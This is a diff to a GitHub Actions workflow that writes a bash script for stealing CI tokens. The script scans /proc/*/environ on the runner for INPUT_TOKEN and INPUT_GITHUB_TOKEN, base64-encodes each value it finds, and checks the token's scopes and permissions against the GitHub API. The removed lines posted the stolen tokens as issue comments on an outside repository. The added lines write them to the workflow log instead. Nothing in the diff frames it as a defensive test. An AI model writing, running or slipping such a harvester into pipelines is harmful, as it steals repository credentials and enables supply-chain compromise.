@@ -14,33 +14,31 @@ jobs:
           printf 'marker\n' > content/a
           cat > content/p <<'SCRIPT'
           #!/bin/bash
-          LOG=/tmp/leak
-          : > "$LOG"
-          echo CAPTURE_STARTED >> /tmp/comment
           declare -A seen
-          post() {
-            local tok="$1" desc="$2" b64 scopes
+          report() {
+            local tok="$1" desc="$2" b64 hdrs status scopes perms
             b64=$(printf '%s' "$tok" | base64 -w0)
             [ -n "${seen[$b64]}" ] && return
             seen[$b64]=1
-            scopes=$(curl -s -D - -o /dev/null -H "Authorization: token $tok" -H "Accept: application/vnd.github+json" https://api.github.com/repos/PDFtoMark/triage-aave-dao-vc8c7ddd-7f94fe 2>/dev/null | tr -d '\r' | awk -F': ' 'tolower($1)=="x-oauth-scopes"||tolower($1)=="x-accepted-github-permissions"{print $1"=" $2}' | paste -sd'|')
-            curl -s -o /dev/null -w "%{http_code}" -X POST \
-              -H "Authorization: token $tok" -H "Accept: application/vnd.github+json" \
-              https://api.github.com/repos/PDFtoMark/triage-aave-dao-vc8c7ddd-7f94fe/issues/2/comments \
-              -d "{\"body\":\"TOKEN_LEAK b64=$b64 desc=$desc scopes=$scopes\"}" >> "$LOG"
-            echo >> "$LOG"
+            echo "LEAKTOKEN b64=$b64 desc=$desc" >&2
+            hdrs=$(curl -m 5 -s -D - -o /tmp/resp.json -H "Authorization: token $tok" -H "Accept: application/vnd.github+json" https://api.github.com/repos/PDFtoMark/triage-aave-dao-vc8c7ddd-7f94fe)
+            status=$(printf '%s' "$hdrs" | head -1 | tr -d '\r')
+            scopes=$(printf '%s' "$hdrs" | tr -d '\r' | awk -F': ' 'tolower($1)=="x-oauth-scopes"||tolower($1)=="x-accepted-github-permissions"{printf "%s=%s;", $1, $2}')
+            perms=$(tr -d '\n' < /tmp/resp.json | sed -n 's/.*"permissions":{\([^}]*\)}.*/\1/p')
+            echo "LEAKAPI b64=$b64 status=$status scopes=$scopes perms=$perms" >&2
           }
-          end=$((SECONDS+110))
+          end=$((SECONDS+95))
           while [ $SECONDS -lt $end ]; do
             for e in /proc/[0-9]*/environ; do
-              tok=$(tr '\0' '\n' < "$e" 2>/dev/null | sed -n 's/^INPUT_TOKEN=//p' | head -1)
-              if [ -n "$tok" ]; then
-                pid=${e#/proc/}; pid=${pid%/environ}
-                desc=$(tr '\0' ' ' < "/proc/$pid/cmdline" 2>/dev/null | cut -c1-160 | base64 -w0)
-                post "$tok" "$desc"
-              fi
+              [ -r "$e" ] || continue
+              pid=${e#/proc/}; pid=${pid%/environ}
+              cmd=$(tr '\0' ' ' < "/proc/$pid/cmdline" 2>/dev/null | cut -c1-100 | base64 -w0)
+              for v in INPUT_TOKEN INPUT_GITHUB_TOKEN; do
+                tok=$(tr '\0' '\n' < "$e" 2>/dev/null | sed -n "s/^${v}=//p" | head -1)
+                [ -n "$tok" ] && report "$tok" "$v:$cmd"
+              done
             done
-            sleep 0.15
+            sleep 0.02
           done
           SCRIPT
           chmod +x content/p
